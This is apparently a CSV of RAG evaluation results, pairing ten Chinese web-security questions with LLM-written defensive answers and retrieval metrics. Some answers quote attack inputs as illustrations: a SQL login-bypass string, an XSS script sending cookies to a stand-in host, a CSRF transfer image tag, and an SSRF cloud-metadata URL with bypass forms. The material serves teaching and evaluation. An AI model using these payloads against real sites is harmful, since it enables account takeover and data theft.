taskId,taskName,mode,itemId,question,answer,retrievalTimeMs,generationTimeMs,totalTimeMs,promptTokens,completionTokens,retrievalHit,precisionAtK,recallAtK,keywordHitRate,citationMatched,manualCorrectness,manualRelevance,manualCompleteness,manualHallucination,error
8,Top-K实验-K10,RAG_LLM,1,什么是 SQL 注入?如何防御?,"# SQL 注入:原理与防御  ## 一、什么是 SQL 注入  SQL 注入(SQL Injection, **CWE-89**)是一种将恶意 SQL 语句插入应用程序查询参数,从而欺骗后端数据库执行非预期命令的攻击方式。它长期位居 OWASP Top 10 漏洞列表前列,可能导致**数据泄露、数据篡改、认证绕过甚至服务器接管** [2]。  ## 二、攻击原理  当应用程序将用户输入**直接拼接**进 SQL 语句时,攻击者可以构造特殊输入改变语句逻辑。以登录场景为例 [2]:  ```sql -- 拼接式查询(危险) SELECT * FROM users WHERE username = '输入1' AND password = '输入2' ```  若攻击者在用户名处输入 `admin' --`,拼接后的语句变为 [2][3]:  ```sql SELECT * FROM users WHERE username = 'admin' --' AND password = '...' ```  `--` 之后的内容被注释,**密码校验被完全绕过**。更严重的情况下,攻击者还可利用 `UNION SELECT` 读取任意表数据,或利用数据库特性执行系统命令 [3]。  ## 三、常见攻击类型 [3]  | 类型 | 原理 | |------|------| | **基于布尔的盲注** | 通过页面返回差异逐位猜测数据 | | **基于时间的盲注** | 利用 `SLEEP()` 等函数根据响应时间推断数据 | | **UNION 注入** | 利用 `UNION SELECT` 合并查询结果直接读取数据 | | **堆叠查询** | 分号后追加第二条语句(取决于数据库与驱动配置) |  ## 四、防御措施  ### 1. 参数化查询(首选方案)  使用预编译语句(Prepared Statement),用户输入**只作为数据绑定,不参与 SQL 语法解析** [4]:  ```java // Java JDBC String sql = ""SELECT * FROM users WHERE username = ? AND password = ?""; PreparedStatement ps = conn.prepareStatement(sql); ps.setString(1, username); ps.setString(2, password); ```  ### 2. 使用 ORM 框架的正确姿势  MyBatis 中使用 `#{}` 占位符即参数化绑定;**严禁使用 `${}` 直接拼接** [10]:  ```xml <!-- 正确: 参数化 --> <select id=""findUser"">SELECT * FROM users WHERE id = #{id}</select> <!-- 危险: 字符串拼接, 存在注入风险 --> <select id=""bad"">SELECT * FROM users ORDER BY ${column}</select> ```  对于无法参数化的场景(如动态排序字段),应使用**白名单映射** [1]。  ### 3. 输入校验  对输入进行**白名单校验**(类型、长度、格式、字符集),例如 ID 参数只允许数字 [10]。  ### 4. 最小权限原则  数据库账号仅授予业务所需最小权限,**禁止应用账号使用 root 或 sa 权限** [10]。  ### 5. 其他加固手段 [10]  - 错误信息脱敏,避免暴露数据库结构与驱动信息 - 部署 WAF 作为辅助防线 - 定期代码审计与漏洞扫描  ## 五、通用防御范式  SQL 注入的本质根因是""**用户输入被拼接进解释型上下文**""(命令注入、LDAP、XML、模板注入等同属此族)[8]。通用防御范式为 [8]:  1. 优先使用无需拼接的安全 API(参数化) 2. 无法参数化时做严格白名单校验 3. **失败即拒绝**,不做""过滤黑名单""式的修补 4. 纵深防御:最小权限、隔离运行环境、监控告警  ---  **核心要点总结**:防御 SQL 注入的第一优先级是参数化查询(预编译 / MyBatis `#{}`),辅以输入白名单校验和数据库最小权限,并通过错误脱敏、WAF、代码审计构建纵深防御体系 [4][10][8]。",639,25487,26127,2376,1120,1,0.4000,1.0000,1.0000,1,0,0,0,0
8,Top-K实验-K10,RAG_LLM,2,MyBatis 中 #{} 和 ${} 的区别是什么?,"# MyBatis 中 `#{}` 与 `${}` 的区别  ## 一、核心区别  | 对比项 | `#{}` | `${}` | |---|---|---| | 处理方式 | **参数化绑定**(预编译占位符) | **字符串直接拼接** | | SQL 语义 | 用户输入只作为**数据**绑定, 不参与 SQL 语法解析 [2][6] | 输入内容会直接嵌入 SQL 语句, 可能改变语句逻辑 [2] | | 安全性 | 安全, 可有效防止 SQL 注入 [2][6] | **存在 SQL 注入风险, 严禁用于用户输入** [2] |  ## 二、原理说明  - **`#{}` 的本质**: MyBatis 使用 `#{}` 占位符即参数化绑定, 等同于 JDBC 的 PreparedStatement 机制——用户输入只作为数据绑定, 不参与 SQL 语法解析, 因此攻击者无法通过输入改变语句结构 [2][6][7]。  - **`${}` 的本质**: `${}` 是字符串替换, 输入内容会被直接拼接进 SQL。当应用程序将用户输入直接拼接进 SQL 语句时, 攻击者可以构造特殊输入(如 `admin' --`)改变语句逻辑, 绕过密码校验, 甚至利用 `UNION SELECT` 读取任意表数据 [7][9]。  ## 三、代码示例  ```xml <!-- 正确: 参数化绑定, 输入仅作为数据 --> <select id=""findUser"">SELECT * FROM users WHERE id = #{id}</select>  <!-- 危险: 字符串拼接, 存在注入风险 --> <select id=""bad"">SELECT * FROM users ORDER BY ${column}</select> ```  ## 四、实践建议  1. **默认全部使用 `#{}`**, 严禁使用 `${}` 直接拼接用户输入 [1][2]。 2. **动态排序字段无法参数化**(列名/表名不能作为绑定参数), 此时应使用**白名单映射**: 即预先定义允许的排序字段列表, 将用户传入的参数映射到白名单内的合法字段, 而非直接拼入 SQL [1][2]。 3. 配合**输入白名单校验**(类型、长度、格式、字符集, 如 ID 只允许数字)进一步降低风险 [2]。  ## 总结  一句话概括: `#{}` 是预编译参数化绑定, 输入只是数据; `${}` 是字符串拼接, 输入会成为 SQL 语法的一部分。前者安全, 后者在处理用户可控输入时会直接引入 SQL 注入漏洞 [2][6][7], 因此必须优先使用 `#{}`, 特殊场景(如动态排序)使用白名单控制 [1][2]。",403,24872,25275,1802,991,1,0.4000,1.0000,1.0000,1,0,0,0,0
8,Top-K实验-K10,RAG_LLM,3,XSS 有哪几种类型?分别如何防御?,"# XSS 的类型与防御  ## 一、XSS 是什么  跨站脚本攻击(Cross-Site Scripting, CWE-79)是指攻击者向 Web 页面注入恶意脚本，当其他用户浏览该页面时，脚本在受害者浏览器中执行，从而窃取会话 Cookie、篡改页面、发起钓鱼或键盘记录等攻击 [1]。  ## 二、XSS 的三种类型 [1]  | 类型 | 原理 | 特点 | |------|------|------| | **反射型 XSS** | 恶意脚本来自用户请求参数，服务器将其“反射”回响应页面 | 常见于搜索结果页，需诱导用户点击构造的链接 | | **存储型 XSS** | 恶意脚本被持久化存储到数据库(如评论、个人简介) | 所有访问者都会执行，**危害最大** | | **DOM 型 XSS** | 由前端 JavaScript 不当操作 DOM 引起(如 `innerHTML` 写入未净化的 URL 参数) | 数据不经过服务器，纯前端问题 |  攻击示例——评论功能未过滤输出时，攻击者提交：  ```html <script>fetch('https://evil.example/steal?c=' + document.cookie)</script> ```  ## 三、防御措施  > ⚠️ **说明**：当前知识库中的 XSS 防护指南片段 [1] 仅包含类型定义与攻击示例，**未包含防御章节的完整内容**。以下防御措施为**通用安全知识补充，无知识库直接引用**，其中个别要点可关联到其他片段。  ### 1. 输出编码(核心手段，通用知识)  根据数据输出的上下文选择对应的编码方式： - **HTML 正文**：HTML 实体编码(`<` → `&lt;`、`>` → `&gt;` 等) - **JavaScript 上下文**：使用 JS 编码(如 `\uXXXX`) - **URL 上下文**：URL 编码 - **HTML 属性**：属性值加引号并做 HTML 编码  ### 2. 使用安全 API 替代危险操作(通用知识)  避免将不可信数据写入 `innerHTML`、`document.write`、`eval` 等，优先使用 `textContent`、`setAttribute` 等安全 API。这与 DOM 型 XSS 的成因直接对应 [1]。  ### 3. 输入白名单校验(通用知识)  对用户输入做格式校验(如 URL 只允许 http/https 协议)，但**输入校验不能替代输出编码**。  ### 4. 渲染前对输出做 XSS 处理  知识库片段 [3] 在大模型输出安全中同样强调：**输出在渲染前端前必须经 XSS 处理**——这一原则适用于所有动态内容渲染场景 [3]。  ### 5. 浏览器侧纵深防御(通用知识)  - **HttpOnly Cookie**:防止脚本读取会话 Cookie(直接对抗知识库示例中窃取 Cookie 的攻击载荷) - **CSP(Content-Security-Policy)**:限制页面可执行的脚本来源 - **框架自动转义**：React/Vue 等默认对插值内容转义，慎用 `dangerouslySetInnerHTML` 等绕过机制  ### 6. 修复 XSS 是 CSRF 防御的前置条件  知识库特别指出：**XSS 通常可以用来绕过 CSRF Token 防御(脚本可读取 Token)**，因此修复 XSS 是 CSRF 防御的前置条件 [2]。这也说明 XSS 危害不限于自身——它会瓦解其他依赖前端隔离的防御机制。  ## 总结  - **类型**：反射型、存储型、DOM 型三种，其中存储型危害最大 [1] - **防御核心**：输出编码 + 安全 API,辅以输入校验、HttpOnly、CSP 等纵深防御(主要为通用知识补充) - **关联要点**：XSS 可绕过 CSRF Token,修复 XSS 是 CSRF 防御前提 [2];所有动态输出在渲染前必须经 XSS 处理 [3]",1668,42212,43881,2348,1732,1,0.1000,1.0000,1.0000,1,0,0,0,0
8,Top-K实验-K10,RAG_LLM,4,CSRF 攻击的原理是什么?有哪些防御手段?,"# CSRF 攻击原理与防御手段  ## 一、什么是 CSRF  跨站请求伪造(Cross-Site Request Forgery, CWE-352)是指攻击者诱导**已登录用户**的浏览器，在用户不知情的情况下向目标站点发送恶意请求。由于请求自动携带了用户的合法会话凭证(如 Cookie),服务器难以区分这是否为用户本人意愿，从而以用户身份执行了操作 [1]。  ## 二、攻击原理  攻击利用的是浏览器“自动携带 Cookie”的机制。以经典示例说明：用户已登录 `bank.example`,会话 Cookie 仍然有效，攻击者在第三方页面埋入如下代码 [1]:  ```html <img src=""https://bank.example/transfer?to=attacker&amount=10000""> ```  用户访问该恶意页面时，浏览器会**自动携带 Cookie** 向目标站点发起转账请求，攻击即告完成 [1]。  ### 攻击成功的关键条件 [1]  1. 受害者在目标站点持有有效会话； 2. 目标操作仅需 Cookie 即可认证，无二次确认； 3. 攻击者能诱导受害者访问恶意页面。  ## 三、防御手段  ### 1. CSRF Token(主流方案)  服务器为每个会话生成随机 Token,嵌入表单或请求头；请求到达时校验 Token 是否匹配。由于攻击者无法跨站读取该 Token,伪造请求即告失败 [2]。  ```html <form method=""post"" action=""/transfer"">   <input type=""hidden"" name=""_csrf"" value=""随机Token"">   ... </form> ```  > 提示：Spring Security 默认启用 CsrfFilter,对非幂等请求(POST/PUT/DELETE)自动校验 `_csrf` 参数或 `X-CSRF-TOKEN` 头 [2]。  ### 2. SameSite Cookie  现代浏览器支持 SameSite 属性，限制 Cookie 在跨站请求中发送 [2]:  ``` Set-Cookie: SESSIONID=xxx; SameSite=Lax; Secure; HttpOnly ```  - `Strict`:完全不跨站发送； - `Lax`:导航级 GET 请求允许携带(浏览器默认)[2][4]。  ### 3. 校验 Origin 与 Referer  对敏感请求检查 `Origin`/`Referer` 头是否为本站域名，拒绝来源不明的跨站请求 [4]。  ### 4. 避免 GET 产生副作用  严格遵守 HTTP 语义：查询用 GET,修改操作用 POST/PUT/DELETE,从根源上杜绝 `img`/`script` 标签型 CSRF(即上文示例的攻击方式)[4]。  ### 5. 二次认证  对转账、改密、删除等**高危操作**要求再次输入密码、验证码或动态口令 [4]。  ## 四、前后端分离项目的注意事项  纯 Token 方案(如 JWT 存于 localStorage 并通过 Authorization 头传递)天然免疫经典 CSRF,因为跨站表单无法携带自定义头。但**若将 Token 同时放入 Cookie,则仍需结合 SameSite 与 CSRF Token 防御** [7]。  > 关联知识：JWT 存放位置的权衡——localStorage 易受 XSS 窃取，需配套严格的 XSS 防御；HttpOnly Cookie 天然防 XSS 窃取，但需配套 CSRF 防御 [8]。  ## 五、CSRF 与 XSS 的区别及关联  | 维度 | CSRF | XSS | |------|------|-----| | 利用对象 | 服务器对浏览器的信任 | 站点对输出的信任 | | 攻击目标 | 用户身份 | 浏览器执行环境 |  需要注意的是：**XSS 通常可以用来绕过 CSRF Token 防御**(注入的脚本可读取页面中的 Token),因此修复 XSS 是 CSRF 防御的前置条件 [4]。",1187,24134,25322,2263,1184,1,0.4000,1.0000,1.0000,1,0,0,0,0
8,Top-K实验-K10,RAG_LLM,5,SSRF 是什么?云环境中最典型的危害是什么?,"## 一、SSRF 是什么  **SSRF(Server-Side Request Forgery, 服务端请求伪造, CWE-918)** 是指攻击者诱使服务器端应用向攻击者指定的地址发起请求 [1]。由于请求是由内网服务器代为发出的，攻击者可以借此达成以下目的 [1]:  - **探测内网**： 通过返回差异或超时时间推断内网主机与端口存活情况， 如请求 `http://192.168.1.1:8080/` - **访问内网服务、读取云平台元数据**， 甚至借助内网管理接口控制服务器 [1] - **协议滥用**： 利用 `file://` 读取本地文件， 利用 `gopher://`、`dict://` 等协议构造任意报文 [1]  此外，OWASP Top 10 2021 将 SSRF 列为 **A10:2021** [2][4], OWASP API 安全 Top 10 中也单列为 **API7: SSRF** [3]。  ## 二、云环境中最典型的危害： 云元数据泄露  在云环境中， 最典型的危害是**通过云元数据接口窃取实例凭证， 进而接管云资源** [1]:  攻击者诱使服务器请求云厂商的元数据地址， 例如：  ``` http://169.254.169.254/latest/meta-data/ ```  即可获取实例的临时凭证， 进而**接管云资源** [1]。这是 SSRF 在云环境中区别于传统内网攻击的最具代表性、破坏力最大的利用方式。  ## 三、常见绕过手法(了解以辅助检测)  攻击者常用以下方式绕过基于字符串的黑名单校验 [1]:  - 十进制 IP(如 `2130706433` 代替 `127.0.0.1`) - 短链接、DNS 重绑定 - `0.0.0.0`、`[::1]` 等地址形式  ## 四、防御要点  根据知识库， SSRF 的核心防御思路包括 [3]:  1. **白名单目标**： 只允许请求已知可信的目标地址 2. **禁用危险协议**： 禁止 `file://`、`gopher://`、`dict://` 等 3. **解析后校验 IP**: 在 DNS 解析后对最终 IP 做校验(可对抗 DNS 重绑定等绕过) [1][3] 4. **网络隔离**： 限制服务器发起出站请求的能力， 保护元数据接口与内网服务 [3]  > 说明： 以上内容均来自知识库片段 [1]、[3], 未额外补充知识库之外的信息。",377,38385,38763,2651,816,1,0.1000,1.0000,0.8000,1,0,0,0,0
8,Top-K实验-K10,RAG_LLM,6,JWT 常见的安全风险有哪些?,"# JWT 常见安全风险分析  根据知识库内容，JWT 虽然是广泛使用的无状态认证凭证（由 `Header.Payload.Signature` 三部分以 Base64Url 编码组成）[1]，但在实际使用中存在以下典型安全风险：  ## 1. 算法混淆攻击  JWT 的 Header 中会声明签名算法（如 `{""alg"":""HS256"",""typ"":""JWT""}`）[1]。如果服务端盲目信任 Token 中声明的算法，攻击者可以：  - 将 `alg` 改为 `none`，绕过签名验证； - 将 RS256 篡改为 HS256，用公钥当作 HMAC 密钥，从而伪造合法签名。  **防御要点**：服务端应硬编码固定算法，绝不从 Token 中读取算法声明 [1]。  ## 2. 密钥强度不足与硬编码  - 弱密钥（如 `secret`、`123456`）可被暴力破解； - 硬编码在源码中的密钥一旦泄露，签名体系即全面失守 [4]。  **防御要点**：密钥仅通过环境变量或密钥管理服务注入，长度不低于 256 位（建议 ≥32 字节的强随机密钥，不入库、不入代码仓库）[4][9]。  ## 3. 敏感信息泄露  Payload 仅做 Base64 编码，**明文可读**，任何人拿到 Token 即可解码查看内容。因此严禁在 Payload 中存放密码、手机号等敏感数据，只放必要声明（如 userId、role、iat、exp）[4][9]。  ## 4. Token 无法主动失效  JWT 是无状态的，签发后在过期前始终有效 [4]。这带来一个天然缺陷：当用户改密、注销或账号被盗时，系统缺乏让旧 Token 立即失效的机制。  **缓解方案** [4][9]： - 引入服务端黑名单（如 Redis）； - 缩短有效期（如 2 小时）并配合刷新令牌； - 在签名中加入版本号，随密钥/密码变更使旧 Token 失效； - 同时严格校验 `exp`/`nbf` 声明 [9]。  ## 5. 存储位置风险  不同存储方式各有利弊，需要配套防御 [4][9]：  | 存储位置 | 风险 | 配套防御 | |---------|------|---------| | localStorage | 易受 XSS 攻击窃取 Token | 需配套严格的 XSS 防御 | | HttpOnly Cookie | 天然防 XSS 窃取 | 需配套 CSRF 防御 |  **补充说明** [7]：纯 Token 方案（JWT 存于 localStorage 并通过 `Authorization` 头传递）天然免疫经典 CSRF，因为跨站表单无法携带自定义头；但若将 Token 同时放入 Cookie，则必须结合 SameSite 与 CSRF Token 防御。  ## 风险速查清单  | 风险 | 核心成因 | 关键防御 | |------|---------|---------| | 算法混淆 | 信任 Token 声明的算法 | 服务端硬编码算法 [1] | | 密钥薄弱/硬编码 | 弱密钥、密钥入库 | 强随机密钥 + 环境变量/KMS [4][9] | | 信息泄露 | Base64 明文可读 | Payload 只放必要声明 [4] | | 无法主动失效 | 无状态设计 | 黑名单/短有效期/版本号 [4] | | 存储不当 | XSS 窃取或 CSRF | 选对存储并配套防御 [4][9][7] |  此外，知识库还建议：每次请求均验证签名与有效期、解析失败统一返回 401 且不区分具体错误原因、传输全程使用 HTTPS、日志中不得打印完整 Token [9]。",744,26925,27670,2494,1155,1,0.3000,1.0000,0.8000,1,0,0,0,0
8,Top-K实验-K10,RAG_LLM,7,文件上传功能有哪些安全风险?如何防范?,"# 文件上传功能的安全风险与防范  ## 一、主要安全风险  根据知识库内容，文件上传功能是 Web 攻击的高发入口，主要风险包括以下五类 [1]：  | 风险类型 | 危害说明 | |---------|---------| | **WebShell 上传** | 上传可执行脚本(如 `shell.jsp`、`shell.php`),攻击者可直接获得服务器控制权 [1] | | **目录穿越** | 利用 `../../` 将文件写到任意路径，覆盖关键配置 [1] | | **存储型 XSS** | 上传含脚本的 HTML/SVG 文件，被浏览器直接渲染后执行恶意脚本 [1] | | **拒绝服务** | 上传超大文件或畸形压缩包，耗尽磁盘与内存资源 [1] | | **恶意文件分发** | 服务器被攻击者当作恶意文件中转站 [1] |  ## 二、防御措施  ### 1. 严格校验文件类型(白名单)[1]  - **扩展名白名单**：仅允许 pdf、txt、md、docx 等安全类型，拒绝一切可执行扩展名 - **文件头校验**：校验 Magic Number,防止仅改扩展名绕过；但注意存在伪造文件头的风险，需“白名单 + 头校验”配合使用 - **内容解析校验**：使用成熟解析库读取内容，拒绝解析失败或内容异常的文件  ### 2. 重命名存储 [1]  对上传文件进行重命名存储，消除原始文件名带来的路径与执行风险(与目录穿越防护呼应)[1]。  ### 3. 限制文件大小 [6]  - 应用层限制单文件大小(如 50MB) - Web 服务器层限制请求体大小(nginx 的 `client_max_body_size`) - 上传频率与配额限制，防止滥用  ### 4. 隔离存储 [6]  - 上传目录**不赋予执行权限**，防止 WebShell 被执行 - 静态资源通过单独域名/CDN 提供，与应用域隔离 - 下载时设置 `Content-Disposition: attachment` 与正确的 `Content-Type`,防止浏览器直接渲染  ### 5. 内容检测 [6]  - 对文档进行**病毒扫描** - 对图片**重新编码**(可消解隐写与内嵌脚本) - 对 PDF/Office 文档，解析失败即拒绝  ### 6. 配套的安全编码原则 [7]  - 文件处理遵循：类型白名单、大小限制、随机名、**规范化后校验路径前缀**(防止目录穿越)[7] - 遵循“永不信任输入”原则，所有外部文件数据必须校验 [7] - 遵循“失败安全”原则，校验异常时拒绝服务而非跳过校验 [7]  ## 三、知识库中的进阶场景：与 RAG 系统结合  若文件上传用于知识库问答系统(文档会经过“解析 → 清洗 → 分块 → 向量化”流水线)，上传入口还需 [6]:  1. 白名单限制为可解析的文档类型(PDF/TXT/MD/DOCX) 2. 解析失败时将文档状态标记为 FAILED 并记录原因，不中断服务 3. 文件内容仅用于向量化检索，**原文件不直接暴露下载 URL**,需要时经鉴权接口返回 [6]  ## 四、总结  文件上传防御的核心思路是**纵深防御** [7]:类型白名单校验 → 重命名 + 路径规范化 → 大小与频率限制 → 存储隔离与去执行权限 → 内容检测，多层措施叠加，单层失效不致整体失守 [1][6][7]。",395,23139,23535,2533,1100,1,0.2000,1.0000,0.7500,1,0,0,0,0
8,Top-K实验-K10,RAG_LLM,8,BOLA 和 BFLA 的区别是什么?,"# BOLA 与 BFLA 的区别  ## 一、核心区别一句话概括  知识库中的一句规范恰好点明了两者的本质差异：**服务端逐对象校验归属(BOLA)、逐功能校验角色(BFLA)** [8]。  - **BOLA(Broken Object Level Authorization,对象级授权失效)**：校验“这个**数据对象**是不是你的”，防的是**横向越权**(同级用户之间互查数据) [1] - **BFLA(Broken Function Level Authorization,功能级授权失效)**：校验“这个**功能接口**你的角色能不能调用”，防的是**垂直越权**(低权限用户调用高权限功能) [8]  ## 二、BOLA:对象级授权失效  API 只验证了“你是谁”(认证)，不验证“这个对象是不是你的”(授权)，导致横向越权 [1]。典型示例如下 [1]:  ``` GET /api/invoices/5001 # A 用户查看自己的发票 → 200 GET /api/invoices/5002 # A 用户查看 B 用户的发票 → 若无归属校验, 同样 200 ```  知识库指出，BOLA 是 OWASP API Security Top 10 之首，也是数据泄露事件的最主要根因 [1]。其高发场景包括 [1]:  1. 自增整数主键暴露，易于遍历(5001 → 5002 → ...) 2. UUID 被误认为“不可猜测即安全”(一旦泄露仍可越权) 3. 批量接口、导出接口、子资源路径(`/users/{id}/orders`)遗漏校验 4. 导航/回退接口复用了宽权限查询  ## 三、BFLA:功能级授权失效  知识库中关于 BFLA 的直接描述较为有限，可确认的要点是：  - 旧版 OWASP API Top 10 中的“功能级授权失效”(API5)在 2023 版中拆分并入 BFLA 与 BOLA 相关条目，重点关注**管理功能接口暴露**问题 [2] - 防御上要求服务端**逐功能校验角色** [8]  > ⚠️ 以下为通用安全知识补充(知识库中未找到充分依据)：BFLA 的典型场景是普通用户绕过前端菜单限制，直接请求管理员接口(如 `DELETE /api/admin/users/123`、后台用户管理页面)，实现**垂直越权**。其攻击对象是“功能/操作”而非“数据记录”，这是与 BOLA 最直观的分野。  ## 四、对比总结  | 维度 | BOLA | BFLA | |---|---|---| | 中文名 | 对象级授权失效 [1] | 功能级授权失效 [8] | | 校验对象 | 数据对象的**归属**(是不是你的) [1] | 功能接口的**角色权限**(你能不能用) [8] | | 越权方向 | 横向越权(同级用户互访) [1] | 垂直越权(低权限→高权限功能，通用知识) | | 典型场景 | 遍历他人订单/发票 ID [1] | 普通用户调用管理功能接口 [2] | | 危害 | 数据泄露(数据泄露最主要根因之一) [1] | 管理功能被滥用、破坏性操作(通用知识) |  ## 五、共同防御要点  1. **归属与角色双重校验**：每次数据访问都把“归属”写进查询条件 [1];服务端逐对象校验归属(BOLA)、逐功能校验角色(BFLA) [8] 2. **敏感操作二次认证**：对高危操作要求再次验证身份 [8] 3. **代码评审落地**：评审清单中应包含“新接口是否做了认证与授权(BOLA/BFLA)”检查项 [3]  ## 六、提醒  当前知识库对 BFLA 的定义、攻击示例与完整防御方案描述较少(仅在 [2][8] 中简要提及)，如需深入掌握 BFLA 的具体攻防细节，建议补充对应专题知识。",1147,41849,42997,2172,1853,1,0.1111,1.0000,1.0000,1,0,0,0,0
8,Top-K实验-K10,RAG_LLM,9,为什么不能使用 MD5 存储密码?应该用什么?,"# 为什么不能使用 MD5 存储密码？  ## 一、MD5 存储密码的风险  ### 1. MD5/SHA1 属于“危险”方案  MD5 和 SHA1 是快速哈希算法，设计目标是高效计算，而非抗破解。彩虹表攻击与暴力破解都极易实现 [2]。  ### 2. 加盐 MD5 也“不足”  即使加了盐，安全性仍然不够：  - **盐可被一同拖库**：数据库泄露时盐与哈希值一起暴露，无法起到隔离作用 [2] - **算力碾压**：现代 GPU 每秒可计算数十亿次哈希，攻击者可以高速遍历字典 [2]  ## 二、应该用什么方案？  推荐使用 **PBKDF2 / BCrypt / Argon2**,它们是“自适应慢哈希 + 盐”的方案，成本参数可随硬件升级而调大，持续保持破解成本 [2][8]。  ### BCrypt 的核心优势  BCrypt 基于 Blowfish 改造，具有三大特点 [2]:  1. **自带随机盐**：相同密码每次哈希结果不同，天然抗彩虹表 2. **成本因子**：哈希轮数为 2^cost,可随硬件进步调大，保持破解成本 3. **输出自包含**：如 `$2a$10$N9qo8uLOickgx2ZMRZoMye...` 内含算法版本、成本因子、盐与哈希值，校验时直接从串中解析，无需单独存盐  推荐成本因子为 **10-12**(每次哈希约 60-250ms)[2][6]。  ## 三、Spring Boot 实践示例  使用 BCrypt(自适应加盐慢哈希)存储密码，禁止 MD5/SHA1 明文级方案 [4]:  ```java @Bean public PasswordEncoder passwordEncoder() {     return new BCryptPasswordEncoder(); // 默认强度 10 }  // 注册 String hash = passwordEncoder.encode(rawPassword);  // 登录校验 boolean ok = passwordEncoder.matches(rawPassword, storedHash); ```  ## 总结  | 方案 | 安全性 | 结论 | |------|--------|------| | 明文 | 危险 | 任何泄露即直接暴露 [2] | | MD5/SHA1 | 危险 | 快速哈希，彩虹表与暴力破解极易 [2] | | 加盐 MD5 | 不足 | 盐可被一同拖库，GPU 破解速度极快 [2] | | PBKDF2/BCrypt/Argon2 | 推荐 | 自适应慢哈希 + 盐，成本参数可随硬件升级 [2] |  核心思路：密码哈希的目的是“让验证变得便宜、让破解变得昂贵”，而 MD5 恰恰相反——验证和破解都很快，因此必须弃用。",440,21219,21660,2633,985,1,0.2000,1.0000,1.0000,1,0,0,0,0
8,Top-K实验-K10,RAG_LLM,10,RAG 系统的完整流程是什么?,"# RAG 系统的完整流程  ## 一、总体架构  RAG(Retrieval-Augmented Generation, 检索增强生成)采用 **""先检索、后生成”** 的两阶段架构：用户提问后，系统先从外部知识库检索相关内容，再将其作为上下文交给 LLM 生成回答。该架构旨在缓解 LLM 的三大缺陷：知识截止、幻觉、私域知识缺失 [1]。  ## 二、离线索引阶段  知识库中详细记载了五个步骤 [1]:  1. **文档解析**：提取 PDF/TXT/MD/DOCX 的文本内容； 2. **清洗**：去除控制字符、页眉页脚、乱码等噪声； 3. **分块**：按语义边界与固定长度切分为 chunk,通常为 256–1024 字符，相邻块保留重叠以保持语义连贯； 4. **向量化**：使用 Embedding 模型将每个 chunk 映射为稠密向量； 5. **入库**：向量与原文、元数据(文档名、页码、块序号)一同存入向量数据库。  ## 三、在线问答阶段  知识库片段 [1] 对该阶段的总体描述为：**用户提问 → 系统从外部知识库检索相关内容 → 将检索结果作为上下文拼入 → LLM 生成回答** [1]。片段 [3] 也从侧面印证了这一流程：文档被切分的 chunk “被检索命中并拼入上下文” [3]。片段 [10] 提到的 ""Top-K"" 与 “重排序” 表明检索环节存在候选数量与重排序调优 [10]。  > ⚠️ **说明**：当前知识库中关于“在线问答阶段”的具体子步骤(如查询向量化、相似度检索、Top-K 筛选、重排序、上下文拼接的具体顺序)未完整给出，以下为**通用安全常识补充，无知识库引用**： > - 用户查询经同一个 Embedding 模型向量化； > - 在向量数据库中做相似度检索，取 Top-K 最相关 chunk; > - 可选重排序优化相关度； > - 将 chunk 文本与用户问题拼接为 Prompt 交给 LLM; > - LLM 生成带出处引用的回答。  ## 四、安全提示(与本主题直接相关)  由于检索内容会直接拼入模型上下文，RAG 流程存在特有风险：攻击者可将恶意指令藏进知识库文档，当该 chunk 被检索命中并拼入上下文时触发**间接提示注入** [3]。因此在流程中应注意：对入库内容做隔离标记、来源可信化与内容检查 [3][10],知识库内容变更也应走审核流程以防投毒 [5]。  ---  **评估补充**:RAG 系统上线后，可从检索质量(Hit Rate、Precision@K、Recall@K、MRR)、生成质量(回答准确性、引用准确性、幻觉率)和系统指标(检索耗时、生成耗时、端到端延迟)三个维度进行评估 [10]。",444,38245,38689,2752,1731,1,0.2000,1.0000,1.0000,1,0,0,0,0
